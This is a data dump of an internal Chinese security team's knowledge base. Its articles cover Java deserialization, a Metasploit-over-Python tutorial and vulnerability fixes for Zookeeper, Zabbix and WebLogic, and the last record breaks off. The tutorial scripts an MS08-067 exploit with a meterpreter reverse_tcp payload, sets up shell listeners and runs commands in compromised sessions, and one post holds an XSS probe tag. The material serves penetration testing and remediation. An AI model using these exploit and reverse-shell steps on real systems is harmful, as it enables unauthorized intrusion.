CATEGORY = [{"_id": "5de76127152e93ac81d7edce", "name": "技术分享", "create_time": 1575444775.06172, "count": 33}, {"_id": "5de76127152e93ac81d7edd1", "name": "内部系统说明文档", "create_time": 1575444775.07003, "count": 5}, {"_id": "5de76127152e93ac81d7edd2", "name": "部门安全规范制度", "create_time": 1575444775.07267, "count": 1}, {"_id": "5de76127152e93ac81d7edd3", "name": "漏洞知识库", "create_time": 1575444775.07571, "count": 16}, {"_id": "5de76127152e93ac81d7edd4", "name": "公司安全规范制度", "create_time": 1575444775.07829, "count": 2}, {"_id": "5de76127152e93ac81d7edd5", "name": "漏洞解决方案", "create_time": 1575444775.0808, "count": 31}]


PAPER = [{'_id': '5de76148152e93ac81d80014',
  'title': '减小TemplatesImplpayload的几种方式',
  'alias': '减小TemplatesImplpayload的几种方式',
  'category': 3,
  'author': 'insight2@example.cn',
  'publish_time': 1567762736.0,
  'modify_time': 1567762736.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。\n\nhttps://github.com/SPuerBRead/ddup/blob/master/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95.md\n\n![dashboard.png](upload/images/43281a887a6abf99fa4319bbd9afe32b.png)\n\n<img src=x onerror=>',
  'content': '<p>编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。<\\/p>\n<p>https://github.com/SPuerBRead/ddup/blob/master/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95.md<\\/p>\n<p><img src="upload/images/43281a887a6abf99fa4319bbd9afe32b.png" alt="dashboard.png" /><\\/p>\n<img src=x onerror=>',
  'category_name': '技术分享'},
 {'_id': '5de76148152e93ac81d80012',
  'title': 'Apache Commons Collections反序列化',
  'alias': 'Apache Commons Collections反序列化',
  'category': 3,
  'author': 'insight2@example.cn',
  'publish_time': 1566380677.0,
  'modify_time': 1567751143.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '# Apache Commons Collections反序列化\r\n\r\n编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。\r\n\r\nhttps://github.com/SPuerBRead/ddup/blob/master/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90.md',
  'content': '<h1>Apache Commons Collections反序列化<\\/h1>\n<p>编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。<\\/p>\n<p><a href="https://github.com/SPuerBRead/ddup/blob/master/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90.md" rel="nofollow">https://github.com/SPuerBRead/ddup/blob/master/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90.md<\\/a><\\/p>',
  'category_name': '技术分享'},
 {'_id': '5de76148152e93ac81d80010',
  'title': 'Msf结合Python的使用',
  'alias': 'Msf结合Python的使用',
  'category': 3,
  'author': 'insight2@example.cn',
  'publish_time': 1545726396.0,
  'modify_time': 1545728835.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '# Msf结合Python的使用\r\n===================================================================================================================不太华丽的分割线================================================================================================================================\r\n\r\n## python依赖库\r\n```shell\r\npip install msgpack\r\n#SpiderLabs的那份的msfrpc库的call函数有点问题，我改了一下\r\nwget https://raw.githubusercontent.com/fnmsd/msfrpc/master/python-msfrpc/msfrpc.py\r\n```\r\n\r\n## 起手\r\n\r\nmetaspolit端启动msfrpc\r\n\r\n```ruby\r\nload msgrpc Pass=Rinne\r\n#详细参数\r\n#load msgrpc ServerHost=192.168.1.0 ServerPort=55553 User=user Pass=\'pass123\'\r\n```\r\n\r\n执行结果：\r\n![](/upload/img/2018122508211545726106.png)\r\nPS：也可以不启动msf来启动msfrpcd，不过不推荐，不方便调试。\r\n\r\n```shell\r\nruby msfrpcd -U user -P pass123 -p 55552 -a 127.0.0.1\r\n```\r\n\r\npyhton端进行连接：\r\n\r\n```python\r\nfrom msfrpc import Msfrpc\r\n#默认连接127.0.0.1:55552,如果指定了端口或host可以将空字典改为{"host":hostname,"port":port}的形式指定端口\r\nclient = Msfrpc({})\r\nclient.login(\'msf\',\'Rinne\')#登陆成功返回True\r\n```\r\n\r\n得到一个登陆了的MsfRPC客户端，登陆保持的时间似乎比较短，长时间不用时需要重新登陆。\r\n\r\n## 用法\r\n\r\n### 直接读写Console的用法（不推荐）\r\n\r\n网上很文章是这么做的，先说下这种\r\n\r\n在之前的登陆后的client基础上创建一个控制台，进行写入命令、读取输出，和直接在Metaspolit中操作是相同,个人感觉不太灵活。\r\n\r\n以下转自：https://www.freebuf.com/sectool/61282.html\r\n\r\n```python\r\n#创建控制台\r\nress = client.call(\'console.create\')\r\nconsole_id = ress[\'id\']\r\n#构建好要执行的命令\r\ncommands = """use exploit/windows/smb/ms08_067_netapi\r\nset PAYLOAD windows/meterpreter/reverse_tcp\r\nset RHOST """+RHOST+"""\r\nset LHOST """+LHOST+"""\r\nset LPORT """+LPORT+"""\r\nset ExitOnSession false\r\nexploit -z\r\n"""\r\nprint "[+] Exploiting MS08-067 on: "+RHOST\r\n#将构建好的命令写入控制台\r\nclient.call(\'console.write\',[console_id,commands])\r\n#读取执行结果\r\nres = client.call(\'console.read\',[console_id])\r\nresult = res[\'data\'].split(\'\\n\')\r\n```\r\n\r\n### 使用module\\jobs\\sessions API进行操作\r\n\r\n1. module API\r\n\r\n   ```python\r\n   #ModuleType exploit/post/payload/payloads/encoders\r\n   client.call(\'module.execute\',["ModuleType", "ModuleName", {\r\n     "RHOST" => "1.2.3.4",\r\n     "RPORT" => "80"\r\n     }])\r\n   ```\r\n\r\n   比如想使用multi/handler的进行meterpreter的监听（metasploit中设置参数时参数名可以忽略大小写，API调用时一定要注意大小写）\r\n\r\n   ```python\r\n   client.call(\'module.execute\',[\'exploit\',\'multi/handler\',{\r\n       \'LHOST\':\'0.0.0.0\',\r\n       \'LPORT\':22334,\r\n       \'PAYLOAD\':\'windows/meterpreter/reverse_tcp\'\r\n   }])\r\n   ```\r\n\r\n![](/upload/img/2018122508221545726133.png)\r\n   可以看到成功创建了任务，如果任务创建不成功则job_id为None\r\n\r\n1. jobs API\r\n\r\n   - 刚才创健的那个任务我们可以使用job.list API看到\r\n\r\n   ```python\r\n   client.call(\'job.list\')\r\n   ```\r\n\r\n\r\n\r\n![](/upload/img/2018122508221545726153.png)\r\n   - 如果想看到job的详细情况可以使用job.info API\r\n\r\n   ```python\r\n   client.call(\'job.info\',[jobid])\r\n   ```\r\n\r\n![](/upload/img/2018122508231545726203.png)\r\n   - 如果想停止任务使用job.stop API\r\n\r\n   ```python\r\n   client.call(\'job.stop\',[jobid])\r\n   ```\r\n![](/upload/img/2018122508231545726226.png)\r\n\r\n   同时，可以看到对一个不存在的job使用stop会返回error。\r\n\r\n   1. session API\r\n\r\n   - 查看当前session\r\n\r\n   ```python\r\n   client.call(\'session.list\')\r\n   ```\r\n\r\n   会返回详细的session信息\r\n![](/upload/img/2018122508241545726260.png)\r\n\r\n   - 停止session\r\n\r\n     ```python\r\n     client.call(\'session.stop\',[sessionid])\r\n     #还有个session.meterpreter_session_kill是杀掉meterpreter打开的channel或者shell\r\n     ```\r\n\r\n   - 操作shell类session(直接往shell里写命令)\r\n\r\n     ```python\r\n     client.call(\'session.shell_write\',[sessionid,\'whoami\'])\r\n     client.call(\'session.shell_read\',[sessionid])\r\n     ```\r\n\r\n   - 操作meterpreter类session（相当于直接在控制台里与meterpreter进行交互）\r\n\r\n     ```python\r\n     client.call(\'session.meterpreter_write\',[sessionid,\'getuid\'])\r\n     client.call(\'session.meterpreter_read\',[sessionid])\r\n     #还有一个session.meterpreter_run_single可以自行看下手册\r\n     ```\r\n![](/upload/img/2018122508251545726339.png)\r\n   - session升级(shell升级到meterpreter)\r\n\r\n     ```\r\n     client.call(\'session.shell_upgrade\',[sessionid])\r\n     ```\r\n## 额外的一点东西\r\n\r\n有的时候只是为了批量执行命令可以不使用msfrpc，直接写一个rc文件进行批量执行即可。\r\n\r\n比如我只是想快速开一个监听器,按照metaspolit命令写这样一个脚本即可，比如叫listener.rc\r\n\r\n```ruby\r\nuse multi/handler\r\nset payload windows/meterpter/reverse_tcp\r\nset lhost 0.0.0.0\r\nset lport 12345\r\nset exitonsession false\r\nexploit -j -z\r\n```\r\n\r\n打开msf直接执行resource listener.rc；或者msfconsole -r listener.rc。\r\n\r\n------\r\n\r\n同样在meterpreter session连接的时候，可以让其自动执行脚本。\r\n\r\n```\r\nuse multi/handler\r\nset AutoRunScript "multi_console_command -r /root/meterpreter.rc"\r\n```\r\n\r\n注意，一定要set AutoRunScript以后再启动handler，否则不生效。\r\n\r\n设置好后，当新的session接入后就会自动执行文件中的命令。\r\n\r\n## 参考\r\n\r\n1. MSF常用RPC API（moudles\\sessions\\jobs....)\r\n\r\n   https://metasploit.help.rapid7.com/docs/standard-api-methods-reference\r\n\r\n2. RPC相关参数\r\n\r\n   https://metasploit.help.rapid7.com/docs/rpc-api',
  'content': '<h1>Msf结合Python的使用<\\/h1>\n<p>===================================================================================================================不太华丽的分割线================================================================================================================================<\\/p>\n<h2>python依赖库<\\/h2>\n<p>```shell\npip install msgpack<\\/p>\n<h1>SpiderLabs的那份的msfrpc库的call函数有点问题，我改了一下<\\/h1>\n<p>wget <a href="https://raw.githubusercontent.com/fnmsd/msfrpc/master/python-msfrpc/msfrpc.py" rel="nofollow">https://raw.githubusercontent.com/fnmsd/msfrpc/master/python-msfrpc/msfrpc.py<\\/a>\n```<\\/p>\n<h2>起手<\\/h2>\n<p>metaspolit端启动msfrpc<\\/p>\n<p>```ruby\nload msgrpc Pass=Rinne<\\/p>\n<h1>详细参数<\\/h1>\n<h1>load msgrpc ServerHost=192.168.1.0 ServerPort=55553 User=user Pass=\'pass123\'<\\/h1>\n<p>```<\\/p>\n<p>执行结果：\n<img alt="" src="/upload/img/2018122508211545726106.png">\nPS：也可以不启动msf来启动msfrpcd，不过不推荐，不方便调试。<\\/p>\n<p><code>shell\nruby msfrpcd -U user -P pass123 -p 55552 -a 127.0.0.1<\\/code><\\/p>\n<p>pyhton端进行连接：<\\/p>\n<p>```python\nfrom msfrpc import Msfrpc<\\/p>\n<h1>默认连接127.0.0.1:55552,如果指定了端口或host可以将空字典改为{"host":hostname,"port":port}的形式指定端口<\\/h1>\n<p>client = Msfrpc({})\nclient.login(\'msf\',\'Rinne\')#登陆成功返回True\n```<\\/p>\n<p>得到一个登陆了的MsfRPC客户端，登陆保持的时间似乎比较短，长时间不用时需要重新登陆。<\\/p>\n<h2>用法<\\/h2>\n<h3>直接读写Console的用法（不推荐）<\\/h3>\n<p>网上很文章是这么做的，先说下这种<\\/p>\n<p>在之前的登陆后的client基础上创建一个控制台，进行写入命令、读取输出，和直接在Metaspolit中操作是相同,个人感觉不太灵活。<\\/p>\n<p>以下转自：<a href="https://www.freebuf.com/sectool/61282.html" rel="nofollow">https://www.freebuf.com/sectool/61282.html<\\/a><\\/p>\n<p>```python<\\/p>\n<h1>创建控制台<\\/h1>\n<p>ress = client.call(\'console.create\')\nconsole_id = ress[\'_id\']<\\/p>\n<h1>构建好要执行的命令<\\/h1>\n<p>commands = """use exploit/windows/smb/ms08_067_netapi\nset PAYLOAD windows/meterpreter/reverse_tcp\nset RHOST """+RHOST+"""\nset LHOST """+LHOST+"""\nset LPORT """+LPORT+"""\nset ExitOnSession false\nexploit -z\n"""\nprint "[+] Exploiting MS08-067 on: "+RHOST<\\/p>\n<h1>将构建好的命令写入控制台<\\/h1>\n<p>client.call(\'console.write\',[console_id,commands])<\\/p>\n<h1>读取执行结果<\\/h1>\n<p>res = client.call(\'console.read\',[console_id])\nresult = res[\'data\'].split(\'\\n\')\n```<\\/p>\n<h3>使用module\\jobs\\sessions API进行操作<\\/h3>\n<ol>\n<li>module API<\\/li>\n<\\/ol>\n<p><code>python\n   #ModuleType exploit/post/payload/payloads/encoders\n   client.call(\'module.execute\',["ModuleType", "ModuleName", {\n     "RHOST" => "1.2.3.4",\n     "RPORT" => "80"\n     }])<\\/code><\\/p>\n<p>比如想使用multi/handler的进行meterpreter的监听（metasploit中设置参数时参数名可以忽略大小写，API调用时一定要注意大小写）<\\/p>\n<p><code>python\n   client.call(\'module.execute\',[\'exploit\',\'multi/handler\',{\n       \'LHOST\':\'0.0.0.0\',\n       \'LPORT\':22334,\n       \'PAYLOAD\':\'windows/meterpreter/reverse_tcp\'\n   }])<\\/code><\\/p>\n<p><img alt="" src="/upload/img/2018122508221545726133.png">\n   可以看到成功创建了任务，如果任务创建不成功则job_id为None<\\/p>\n<ol>\n<li>\n<p>jobs API<\\/p>\n<\\/li>\n<li>\n<p>刚才创健的那个任务我们可以使用job.list API看到<\\/p>\n<\\/li>\n<\\/ol>\n<p><code>python\n   client.call(\'job.list\')<\\/code><\\/p>\n<p><img alt="" src="/upload/img/2018122508221545726153.png">\n   - <a href="http://如果想看到job的详细情况可以使用job.info" rel="nofollow">如果想看到job的详细情况可以使用job.info<\\/a> API<\\/p>\n<p><code>python\n   client.call(\'<a href="http://job.info" rel="nofollow">job.info<\\/a>\',[jobid])<\\/code><\\/p>\n<p><img alt="" src="/upload/img/2018122508231545726203.png">\n   - 如果想停止任务使用job.stop API<\\/p>\n<p><code>python\n   client.call(\'job.stop\',[jobid])<\\/code>\n<img alt="" src="/upload/img/2018122508231545726226.png"><\\/p>\n<p>同时，可以看到对一个不存在的job使用stop会返回error。<\\/p>\n<ol>\n<li>\n<p>session API<\\/p>\n<\\/li>\n<li>\n<p>查看当前session<\\/p>\n<\\/li>\n<\\/ol>\n<p><code>python\n   client.call(\'session.list\')<\\/code><\\/p>\n<p>会返回详细的session信息\n<img alt="" src="/upload/img/2018122508241545726260.png"><\\/p>\n<ul>\n<li>\n<p>停止session<\\/p>\n<p><code>python\n client.call(\'session.stop\',[sessionid])\n #还有个session.meterpreter_session_kill是杀掉meterpreter打开的channel或者shell<\\/code><\\/p>\n<\\/li>\n<li>\n<p>操作shell类session(直接往shell里写命令)<\\/p>\n<p><code>python\n client.call(\'session.shell_write\',[sessionid,\'whoami\'])\n client.call(\'session.shell_read\',[sessionid])<\\/code><\\/p>\n<\\/li>\n<li>\n<p>操作meterpreter类session（相当于直接在控制台里与meterpreter进行交互）<\\/p>\n<p><code>python\n client.call(\'session.meterpreter_write\',[sessionid,\'getuid\'])\n client.call(\'session.meterpreter_read\',[sessionid])\n #还有一个session.meterpreter_run_single可以自行看下手册<\\/code>\n<img alt="" src="/upload/img/2018122508251545726339.png">\n   - session升级(shell升级到meterpreter)<\\/p>\n<p><code>client.call(\'session.shell_upgrade\',[sessionid])<\\/code><\\/p>\n<h2>额外的一点东西<\\/h2>\n<\\/li>\n<\\/ul>\n<p>有的时候只是为了批量执行命令可以不使用msfrpc，直接写一个rc文件进行批量执行即可。<\\/p>\n<p>比如我只是想快速开一个监听器,按照metaspolit命令写这样一个脚本即可，比如叫listener.rc<\\/p>\n<p><code>ruby\nuse multi/handler\nset payload windows/meterpter/reverse_tcp\nset lhost 0.0.0.0\nset lport 12345\nset exitonsession false\nexploit -j -z<\\/code><\\/p>\n<p>打开msf直接执行resource listener.rc；或者msfconsole -r listener.rc。<\\/p>\n\n<p>同样在meterpreter session连接的时候，可以让其自动执行脚本。<\\/p>\n<p><code>use multi/handler\nset AutoRunScript "multi_console_command -r /root/meterpreter.rc"<\\/code><\\/p>\n<p>注意，一定要set AutoRunScript以后再启动handler，否则不生效。<\\/p>\n<p>设置好后，当新的session接入后就会自动执行文件中的命令。<\\/p>\n<h2>参考<\\/h2>\n<ol>\n<li>MSF常用RPC API（moudles\\sessions\\jobs....)<\\/li>\n<\\/ol>\n<p><a href="https://metasploit.help.rapid7.com/docs/standard-api-methods-reference" rel="nofollow">https://metasploit.help.rapid7.com/docs/standard-api-methods-reference<\\/a><\\/p>\n<ol>\n<li>RPC相关参数<\\/li>\n<\\/ol>\n<p><a href="https://metasploit.help.rapid7.com/docs/rpc-api" rel="nofollow">https://metasploit.help.rapid7.com/docs/rpc-api<\\/a><\\/p>',
  'category_name': '技术分享'},
 {'_id': '5de76148152e93ac81d8000e',
  'title': 'Zookeeper未授权访问漏洞',
  'alias': 'Zookeeper未授权访问漏洞',
  'category': 10,
  'author': 'qitao4@example.cn',
  'publish_time': 1543227040.0,
  'modify_time': 1543227040.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '| **漏洞类型** | **影响组件** | **危害程度**        |\r\n| ------------ | ------------ | ------------------- |\r\n| 未授权访问   | zookeeper    | 高危                |\r\n| **CVE**      | **发现时间** | **对应poc**         |\r\n| 无           | 无           | Zookeeper_unauth.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;全版本\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;Zookeeper未授权访问\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://yq.aliyun.com/articles/616751\r\n\r\n&emsp;&emsp;&emsp;&emsp;http://zookeeper.apache.org/doc/r3.1.2/zookeeperProgrammers.html#sc_ZooKeeperAccessControl\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。\r\n\r\n&emsp;&emsp;&emsp;&emsp;使用时只要知道zookeeper服务端的IP和Port，任务用户或者客户端根本不需要任何的认证就可以连上zookeeper的服务端，并且可以对znode进行增删等操作。这样数据是非常不安全的，极易被攻击和篡改。但zookeeper服务端目前不支持连接时认证。\r\n\r\n&emsp;&emsp;&emsp;&emsp;为了保障ZooKeeper的数据安全，提供了一套完整的ACL(Access Control List)权限控制机制来保障数据的安全。 \r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;使用zookeeper提供的ADL权限控制机制，详细请参考：\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://www.cnblogs.com/ilovena/p/9484522.html',
  'content': '<p>| <strong>漏洞类型<\\/strong> | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>        |\n| ------------ | ------------ | ------------------- |\n| 未授权访问   | zookeeper    | 高危                |\n| <strong>CVE<\\/strong>      | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>         |\n| 无           | 无           | <a href="http://Zookeeper_unauth.py" rel="nofollow">Zookeeper_unauth.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>\u2003\u2003\u2003\u2003全版本<\\/p>\n检查项目\n<p>\u2003\u2003\u2003\u2003Zookeeper未授权访问<\\/p>\n相关链接\n<p>\u2003\u2003\u2003\u2003<a href="https://yq.aliyun.com/articles/616751" rel="nofollow">https://yq.aliyun.com/articles/616751<\\/a><\\/p>\n<p>\u2003\u2003\u2003\u2003<a href="http://zookeeper.apache.org/doc/r3.1.2/zookeeperProgrammers.html#sc_ZooKeeperAccessControl" rel="nofollow">http://zookeeper.apache.org/doc/r3.1.2/zookeeperProgrammers.html#sc_ZooKeeperAccessControl<\\/a><\\/p>\n<h2>漏洞详情<\\/h2>\n<p>\u2003\u2003\u2003\u2003zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。<\\/p>\n<p>\u2003\u2003\u2003\u2003使用时只要知道zookeeper服务端的IP和Port，任务用户或者客户端根本不需要任何的认证就可以连上zookeeper的服务端，并且可以对znode进行增删等操作。这样数据是非常不安全的，极易被攻击和篡改。但zookeeper服务端目前不支持连接时认证。<\\/p>\n<p>\u2003\u2003\u2003\u2003为了保障ZooKeeper的数据安全，提供了一套完整的ACL(Access Control List)权限控制机制来保障数据的安全。 <\\/p>\n<h2>修复建议<\\/h2>\n<p>\u2003\u2003\u2003\u2003使用zookeeper提供的ADL权限控制机制，详细请参考：<\\/p>\n<p>\u2003\u2003\u2003\u2003<a href="https://www.cnblogs.com/ilovena/p/9484522.html" rel="nofollow">https://www.cnblogs.com/ilovena/p/9484522.html<\\/a><\\/p>',
  'category_name': '漏洞解决方案'},
 {'_id': '5de76148152e93ac81d8000c',
  'title': 'ZabbixGuest账户未禁用',
  'alias': 'ZabbixGuest账户未禁用',
  'category': 10,
  'author': 'qitao4@example.cn',
  'publish_time': 1543226948.0,
  'modify_time': 1543226948.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '| **漏洞类型** | **影响组件** | **危害程度**           |\r\n| ------------ | ------------ | ---------------------- |\r\n| 未授权访问   | Zabbix       | 中危                   |\r\n| **CVE**      | **发现时间** | **对应poc**            |\r\n| 无           | 无           | zabbix_guest_enable.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;全版本\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;Guest账户是否启用\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;无\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。\r\n\r\n&emsp;&emsp;&emsp;&emsp;zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。\r\n\r\n&emsp;&emsp;&emsp;&emsp;zabbix在安装后默认guest账号开放，密码为空登陆，只能看到zabbix后台，存在安全隐患，需要将guest账户禁用。\r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;禁用guest账户',
  'content': '<p>| <strong>漏洞类型<\\/strong> | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>           |\n| ------------ | ------------ | ---------------------- |\n| 未授权访问   | Zabbix       | 中危                   |\n| <strong>CVE<\\/strong>      | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>            |\n| 无           | 无           | <a href="http://zabbix_guest_enable.py" rel="nofollow">zabbix_guest_enable.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>\u2003\u2003\u2003\u2003全版本<\\/p>\n检查项目\n<p>\u2003\u2003\u2003\u2003Guest账户是否启用<\\/p>\n相关链接\n<p>\u2003\u2003\u2003\u2003无<\\/p>\n<h2>漏洞详情<\\/h2>\n<p>\u2003\u2003\u2003\u2003zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。<\\/p>\n<p>\u2003\u2003\u2003\u2003zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。<\\/p>\n<p>\u2003\u2003\u2003\u2003zabbix在安装后默认guest账号开放，密码为空登陆，只能看到zabbix后台，存在安全隐患，需要将guest账户禁用。<\\/p>\n<h2>修复建议<\\/h2>\n<p>\u2003\u2003\u2003\u2003禁用guest账户<\\/p>',
  'category_name': '漏洞解决方案'},
 {'_id': '5de76148152e93ac81d8000a',
  'title': 'WebLogicXMLDecoder反序列化漏洞',
  'alias': 'WebLogicXMLDecoder反序列化漏洞',
  'category': 10,
  'author': 'qitao4@example.cn',
  'publish_time': 1543226886.0,
  'modify_time': 1543226886.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '| **漏洞类型**   | **影响组件** | **危害程度**        |\r\n| -------------- | ------------ | ------------------- |\r\n| 远程命令执行   | Weblogic     | 高危                |\r\n| **CVE**        | **发现时间** | **对应poc**         |\r\n| CVE-2017-10271 | 2017/06/21   | weblogic_wls_rce.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;Oracle WebLogic Server 10.3.6.0.0\r\n\r\n&emsp;&emsp;&emsp;&emsp;Oracle WebLogic Server 12.1.3.0.0\r\n\r\n&emsp;&emsp;&emsp;&emsp;Oracle WebLogic Server 12.2.1.1.0\r\n\r\n#### 检查项目\r\n\r\nWebLogic XMLDecoder反序列化漏洞\r\n\r\n#### 相关链接\r\n\r\nhttps://www.freebuf.com/news/158007.html\r\n\r\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271\r\n\r\nhttps://helpcdn.aliyun.com/knowledge_detail/64233.html\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。\r\n\r\n## 修复建议\r\n\r\n1. 删除war包。根据实际环境路径和业务需求，删除WebLogic程序下列war包及目录\r\n\r\n   ```shell\r\n   rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war\r\n   rm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war\r\n   rm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat\r\n   ```\r\n\r\n2. wls-wsat目录禁止外网访问\r\n\r\n3. 升级WebLogic至最新版本\r\n\r\n',
  'content': '<p>| <strong>漏洞类型<\\/strong>   | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>        |\n| -------------- | ------------ | ------------------- |\n| 远程命令执行   | Weblogic     | 高危                |\n| <strong>CVE<\\/strong>        | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>         |\n| CVE-2017-10271 | 2017/06/21   | <a href="http://weblogic_wls_rce.py" rel="nofollow">weblogic_wls_rce.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>\u2003\u2003\u2003\u2003Oracle WebLogic Server 10.3.6.0.0<\\/p>\n<p>\u2003\u2003\u2003\u2003Oracle WebLogic Server 12.1.3.0.0<\\/p>\n<p>\u2003\u2003\u2003\u2003Oracle WebLogic Server 12.2.1.1.0<\\/p>\n检查项目\n<p>WebLogic XMLDecoder反序列化漏洞<\\/p>\n相关链接\n<p><a href="https://www.freebuf.com/news/158007.html" rel="nofollow">https://www.freebuf.com/news/158007.html<\\/a><\\/p>\n<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271" rel="nofollow">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271<\\/a><\\/p>\n<p><a href="https://helpcdn.aliyun.com/knowledge_detail/64233.html" rel="nofollow">https://helpcdn.aliyun.com/knowledge_detail/64233.html<\\/a><\\/p>\n<h2>漏洞详情<\\/h2>\n<p>\u2003\u2003\u2003\u2003Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。<\\/p>\n<h2>修复建议<\\/h2>\n<ol>\n<li>删除war包。根据实际环境路径和业务需求，删除WebLogic程序下列war包及目录<\\/li>\n<\\/ol>\n<p><code>shell\n   rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war\n   rm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war\n   rm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat<\\/code><\\/p>\n<ol>\n<li>\n<p>wls-wsat目录禁止外网访问<\\/p>\n<\\/li>\n<li>\n<p>升级WebLogic至最新版本<\\/p>\n<\\/li>\n<\\/ol>',
  'category_name': '漏洞解决方案'},
 {'_id': '5de76148152e93ac81d80008',
  'title': 'WebLogicT3反序列化',
  'alias': 'WebLogicT3反序列化',
  'category': 10,
  'author': 'qitao4@example.cn',
  'publish_time': 1543226828.0,
  'modify_time': 1543226828.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
